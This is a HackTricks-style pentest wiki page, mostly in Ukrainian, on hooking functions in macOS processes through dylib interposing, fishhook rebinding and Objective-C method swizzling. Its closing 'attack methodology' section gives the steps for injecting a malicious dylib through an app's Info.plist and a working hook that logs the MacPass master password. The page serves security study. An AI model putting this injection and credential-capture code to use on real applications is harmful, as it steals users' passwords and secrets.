# macOS Function Hooking

{{#include ../../../banners/hacktricks-training.md}}

## Function Interposing

Створіть **dylib** з секцією **`__interpose` (`__DATA___interpose`)** (або секцією з прапором **`S_INTERPOSING`**), що містить кортежі **function pointers**, які посилаються на **original** та **replacement** функції.

Потім **inject** dylib за допомогою **`DYLD_INSERT_LIBRARIES`** (interposing має відбутися до завантаження основного app). Очевидно, [**restrictions**], застосовані до використання **`DYLD_INSERT_LIBRARIES`**, також діють тут.

### Interpose printf

{{#tabs}}
{{#tab name="interpose.c"}}
```c:interpose.c" overflow="wrap
// gcc -dynamiclib interpose.c -o interpose.dylib
#include <stdio.h>
#include <stdarg.h>

int my_printf(const char *format, ...) {
//va_list args;
//va_start(args, format);
//int ret = vprintf(format, args);
//va_end(args);

int ret = printf("Hello from interpose\n");
return ret;
}

__attribute__((used)) static struct { const void *replacement; const void *replacee; } _interpose_printf
__attribute__ ((section ("__DATA,__interpose"))) = { (const void *)(unsigned long)&my_printf, (const void *)(unsigned long)&printf };
```
{{#endtab}}

{{#tab name="hello.c"}}
```c
//gcc hello.c -o hello
#include <stdio.h>

int main() {
printf("Hello World!\n");
return 0;
}
```
{{#endtab}}

{{#tab name="interpose2.c"}}
```c
// Just another way to define an interpose
// gcc -dynamiclib interpose2.c -o interpose2.dylib

#include <stdio.h>

#define DYLD_INTERPOSE(_replacement, _replacee) \
__attribute__((used)) static struct { \
const void* replacement; \
const void* replacee; \
} _interpose_##_replacee __attribute__ ((section("__DATA, __interpose"))) = { \
(const void*) (unsigned long) &_replacement, \
(const void*) (unsigned long) &_replacee \
};

int my_printf(const char *format, ...)
{
int ret = printf("Hello from interpose\n");
return ret;
}

DYLD_INTERPOSE(my_printf,printf);
```
{{#endtab}}
{{#endtabs}}
```bash
DYLD_INSERT_LIBRARIES=./interpose.dylib ./hello
Hello from interpose

DYLD_INSERT_LIBRARIES=./interpose2.dylib ./hello
Hello from interpose
```
> [!WARNING]
> **`DYLD_PRINT_INTERPOSING`** env variable можна використовувати для debug interposing, і він виведе interpose process.

Також зауважте, що **interposing відбувається між process і loaded libraries**, це не працює з shared library cache.

### Dynamic Interposing

Тепер також можливо interpose function динамічно, використовуючи function **`dyld_dynamic_interpose`**. Це дозволяє **programmatically** interpose function у **runtime** замість того, щоб робити це лише з **beginning**.

Потрібно лише вказати **tuples** для **function to replace and the replacement** function.
```c
struct dyld_interpose_tuple {
const void* replacement;
const void* replacee;
};
extern void dyld_dynamic_interpose(const struct mach_header* mh,
const struct dyld_interpose_tuple array[], size_t count);
```
### Переприв’язка Import Table (fishhook-style)

Якщо у вас уже є code execution **всередині process** і ви хочете hook-нути **imported C function** без relaunching цілі, дуже поширений primitive — це **symbol rebinding** (popularised by **`fishhook`**).

Замість використання секції **`__interpose`**, ця technique проходить по Mach-O metadata (`__LINKEDIT` -> indirect symbol table -> `__la_symbol_ptr` / `__nl_symbol_ptr`) і **перезаписує import slot**, який використовує поточний image. Це дуже корисно, щоб hook-нути functions в **already-running** process або hook-нути **лише один image** за допомогою **`rebind_symbols_image`**.

> [!TIP]
> Це впливає лише на calls, які реально проходять через **import pointer**. Якщо target function **викликається directly всередині того самого image**, there is no imported slot to rewrite, тож ця technique не побачить цей call site.
```c
// clang -dynamiclib fishhook_demo.c fishhook.c -o fishhook_demo.dylib
#include <stdio.h>
#include <unistd.h>
#include "fishhook.h"

static int (*real_close)(int);

int hooked_close(int fd) {
fprintf(stderr, "[+] close(%d)\n", fd);
return real_close(fd);
}

__attribute__((constructor))
static void install(void) {
struct rebinding rb = {"close", hooked_close, (void *)&real_close};
rebind_symbols(&rb, 1);
}
```

```bash
DYLD_INSERT_LIBRARIES=./fishhook_demo.dylib ./hello
```
На новіших версіях macOS багато targets rebinding більше не знаходяться у writable **`__DATA`** pages. Rebinders зазвичай потрібно тимчасово зробити **`__DATA_CONST`** writable перед patching pointer. Більше того, на Apple Silicon / **`arm64e`** слід очікувати authenticated pointers та додаткову indirection у **`__AUTH_CONST.__auth_got`**, тож rebinder, який лише сканує класичні lazy/non-lazy symbol pointer sections, може пропустити деякі call sites.

> [!CAUTION]
> **`arm64e`** ABI використовує **Pointer Authentication (PAC)** для багатьох function pointers. Blind pointer writes, які раніше працювали на Intel, можуть зламати call site на Apple Silicon. Коли пишете власний rebinder або inline hooker, будьте готові використовувати helpers з **`<ptrauth.h>`** такі як **`ptrauth_sign_unauthenticated`** або **`ptrauth_auth_and_resign`** і тестуйте саме на **`arm64e`** targets.

Для більшої інформації про **`__AUTH`**, **`__AUTH_CONST`** та **`__auth_got`**, дивіться [цю сторінку](../macos-apps-inspecting-debugging-and-fuzzing/objects-in-memory.md).

## Method Swizzling

В ObjectiveC method викликається так: **`[myClassInstance nameOfTheMethodFirstParam:param1 secondParam:param2]`**

Потрібні **object**, **method** і **params**. І коли method викликається, надсилається **msg** за допомогою функції **`objc_msgSend`**: `int i = ((int (*)(id, SEL, NSString *, NSString *))objc_msgSend)(someObject, @selector(method1p1:p2:), value1, value2);`

Object — це **`someObject`**, method — це **`@selector(method1p1:p2:)`**, а arguments — **value1**, **value2**.

Дотримуючись object structures, можна дістатися до **array of methods**, де **names** і **pointers** до коду method **розташовані**.

> [!CAUTION]
> Зверніть увагу, що оскільки methods і classes доступні на основі їхніх names, ця інформація зберігається в binary, тож її можна отримати за допомогою `otool -ov </path/bin>` або [`class-dump </path/bin>`](https://github.com/nygard/class-dump)

### Accessing the raw methods

Можна отримати доступ до інформації про methods, такої як name, number of params або address, як у наступному прикладі:
```objectivec
// gcc -framework Foundation test.m -o test

#import <Foundation/Foundation.h>
#import <objc/runtime.h>
#import <objc/message.h>

int main() {
// Get class of the variable
NSString* str = @"This is an example";
Class strClass = [str class];
NSLog(@"str's Class name: %s", class_getName(strClass));

// Get parent class of a class
Class strSuper = class_getSuperclass(strClass);
NSLog(@"Superclass name: %@",NSStringFromClass(strSuper));

// Get information about a method
SEL sel = @selector(length);
NSLog(@"Selector name: %@", NSStringFromSelector(sel));
Method m = class_getInstanceMethod(strClass,sel);
NSLog(@"Number of arguments: %d", method_getNumberOfArguments(m));
NSLog(@"Implementation address: 0x%lx", (unsigned long)method_getImplementation(m));

// Iterate through the class hierarchy
NSLog(@"Listing methods:");
Class currentClass = strClass;
while (currentClass != NULL) {
unsigned int inheritedMethodCount = 0;
Method* inheritedMethods = class_copyMethodList(currentClass, &inheritedMethodCount);

NSLog(@"Number of inherited methods in %s: %u", class_getName(currentClass), inheritedMethodCount);

for (unsigned int i = 0; i < inheritedMethodCount; i++) {
Method method = inheritedMethods[i];
SEL selector = method_getName(method);
const char* methodName = sel_getName(selector);
unsigned long address = (unsigned long)method_getImplementation(m);
NSLog(@"Inherited method name: %s (0x%lx)", methodName, address);
}

// Free the memory allocated by class_copyMethodList
free(inheritedMethods);
currentClass = class_getSuperclass(currentClass);
}

// Other ways to call uppercaseString method
if([str respondsToSelector:@selector(uppercaseString)]) {
NSString *uppercaseString = [str performSelector:@selector(uppercaseString)];
NSLog(@"Uppercase string: %@", uppercaseString);
}

// Using objc_msgSend directly
NSString *uppercaseString2 = ((NSString *(*)(id, SEL))objc_msgSend)(str, @selector(uppercaseString));
NSLog(@"Uppercase string: %@", uppercaseString2);

// Calling the address directly
IMP imp = method_getImplementation(class_getInstanceMethod(strClass, @selector(uppercaseString))); // Get the function address
NSString *(*callImp)(id,SEL) = (typeof(callImp))imp; // Generates a function capable to method from imp
NSString *uppercaseString3 = callImp(str,@selector(uppercaseString)); // Call the method
NSLog(@"Uppercase string: %@", uppercaseString3);

return 0;
}
```
### Method Swizzling with method_exchangeImplementations

Функція **`method_exchangeImplementations`** дозволяє **змінювати** **адресу** **implementation** однієї функції на іншу.

> [!CAUTION]
> Тож коли викликається одна функція, **виконується інша**.
```objectivec
//gcc -framework Foundation swizzle_str.m -o swizzle_str

#import <Foundation/Foundation.h>
#import <objc/runtime.h>


// Create a new category for NSString with the method to execute
@interface NSString (SwizzleString)

- (NSString *)swizzledSubstringFromIndex:(NSUInteger)from;

@end

@implementation NSString (SwizzleString)

- (NSString *)swizzledSubstringFromIndex:(NSUInteger)from {
NSLog(@"Custom implementation of substringFromIndex:");

// Call the original method
return [self swizzledSubstringFromIndex:from];
}

@end

int main(int argc, const char * argv[]) {
// Perform method swizzling
Method originalMethod = class_getInstanceMethod([NSString class], @selector(substringFromIndex:));
Method swizzledMethod = class_getInstanceMethod([NSString class], @selector(swizzledSubstringFromIndex:));
method_exchangeImplementations(originalMethod, swizzledMethod);

// We changed the address of one method for the other
// Now when the method substringFromIndex is called, what is really called is swizzledSubstringFromIndex
// And when swizzledSubstringFromIndex is called, substringFromIndex is really called

// Example usage
NSString *myString = @"Hello, World!";
NSString *subString = [myString substringFromIndex:7];
NSLog(@"Substring: %@", subString);

return 0;
}
```
> [!WARNING]
> У цьому випадку, якщо **implementation code of the legit** методу **verify** **method** **name**, він може **detect** це swizzling і запобігти його виконанню.
>
> Наведена нижче technique не має цього обмеження.

### Method Swizzling with method_setImplementation

Попередній формат дивний, тому що ви змінюєте implementation 2 methods один через інший. Використовуючи функцію **`method_setImplementation`**, ви можете **change** **implementation** одного **method for the other one**.

Просто пам’ятайте **store the address of the implementation of the original one**, якщо збираєтеся викликати її з нової implementation перед перезаписом, тому що пізніше буде значно складніше знайти цю адресу.
```objectivec
#import <Foundation/Foundation.h>
#import <objc/runtime.h>
#import <objc/message.h>

static IMP original_substringFromIndex = NULL;

@interface NSString (Swizzlestring)

- (NSString *)swizzledSubstringFromIndex:(NSUInteger)from;

@end

@implementation NSString (Swizzlestring)

- (NSString *)swizzledSubstringFromIndex:(NSUInteger)from {
NSLog(@"Custom implementation of substringFromIndex:");

// Call the original implementation using objc_msgSendSuper
return ((NSString *(*)(id, SEL, NSUInteger))original_substringFromIndex)(self, _cmd, from);
}

@end

int main(int argc, const char * argv[]) {
@autoreleasepool {
// Get the class of the target method
Class stringClass = [NSString class];

// Get the swizzled and original methods
Method originalMethod = class_getInstanceMethod(stringClass, @selector(substringFromIndex:));

// Get the function pointer to the swizzled method's implementation
IMP swizzledIMP = method_getImplementation(class_getInstanceMethod(stringClass, @selector(swizzledSubstringFromIndex:)));

// Swap the implementations
// It return the now overwritten implementation of the original method to store it
original_substringFromIndex = method_setImplementation(originalMethod, swizzledIMP);

// Example usage
NSString *myString = @"Hello, World!";
NSString *subString = [myString substringFromIndex:7];
NSLog(@"Substring: %@", subString);

// Set the original implementation back
method_setImplementation(originalMethod, original_substringFromIndex);

return 0;
}
}
```
## Hooking Attack Methodology

На цій сторінці було розглянуто різні способи hook functions. Однак вони передбачали **запуск коду всередині процесу для атаки**.

Щоб це зробити, найпростішою технікою є inject [Dyld via environment variables or hijacking](macos-library-injection/macos-dyld-hijacking-and-dyld_insert_libraries.md). However, I guess this could also be done via [Dylib process injection](macos-ipc-inter-process-communication/index.html#dylib-process-injection-via-task-port).

However, both options are **limited** to **unprotected** binaries/processes. Check each technique to learn more about the limitations.

Однак function hooking attack є дуже специфічним: attacker робить це, щоб **steal sensitive information from inside a process** (якби ні, ви б просто виконали process injection attack). І ця sensitive information може знаходитися в Apps, завантажених користувачем, таких як MacPass.

Отже, вектор атаки буде таким: або знайти vulnerability, або strip the signature of the application, inject the **`DYLD_INSERT_LIBRARIES`** env variable через Info.plist application, додавши щось на кшталт:
```xml
<key>LSEnvironment</key>
<dict>
<key>DYLD_INSERT_LIBRARIES</key>
<string>/Applications/Application.app/Contents/malicious.dylib</string>
</dict>
```
а потім **re-register** application:
```bash
/System/Library/Frameworks/CoreServices.framework/Frameworks/LaunchServices.framework/Support/lsregister -f /Applications/Application.app
```
Додайте в цю бібліотеку hooking code для exfiltrate information: Passwords, messages...

> [!CAUTION]
> Зверніть увагу, що в новіших версіях macOS, якщо ви **strip the signature** binary застосунку і він раніше вже виконувався, macOS **не виконуватиме** застосунок більше.

#### Library example
```objectivec
// gcc -dynamiclib -framework Foundation sniff.m -o sniff.dylib

// If you added env vars in the Info.plist don't forget to call lsregister as explained before

// Listen to the logs with something like:
// log stream --style syslog --predicate 'eventMessage CONTAINS[c] "Password"'

#include <Foundation/Foundation.h>
#import <objc/runtime.h>

// Here will be stored the real method (setPassword in this case) address
static IMP real_setPassword = NULL;

static BOOL custom_setPassword(id self, SEL _cmd, NSString* password, NSURL* keyFileURL)
{
// Function that will log the password and call the original setPassword(pass, file_path) method
NSLog(@"[+] Password is: %@", password);

// After logging the password call the original method so nothing breaks.
return ((BOOL (*)(id,SEL,NSString*, NSURL*))real_setPassword)(self, _cmd,  password, keyFileURL);
}

// Library constructor to execute
__attribute__((constructor))
static void customConstructor(int argc, const char **argv) {
// Get the real method address to not lose it
Class classMPDocument = NSClassFromString(@"MPDocument");
Method real_Method = class_getInstanceMethod(classMPDocument, @selector(setPassword:keyFileURL:));

// Make the original method setPassword call the fake implementation one
IMP fake_IMP = (IMP)custom_setPassword;
real_setPassword = method_setImplementation(real_Method, fake_IMP);
}
```
## References

- [https://nshipster.com/method-swizzling/](https://nshipster.com/method-swizzling/)
- [https://github.com/facebook/fishhook](https://github.com/facebook/fishhook)
- [https://clang.llvm.org/docs/PointerAuthentication.html](https://clang.llvm.org/docs/PointerAuthentication.html)

{{#include ../../../banners/hacktricks-training.md}}
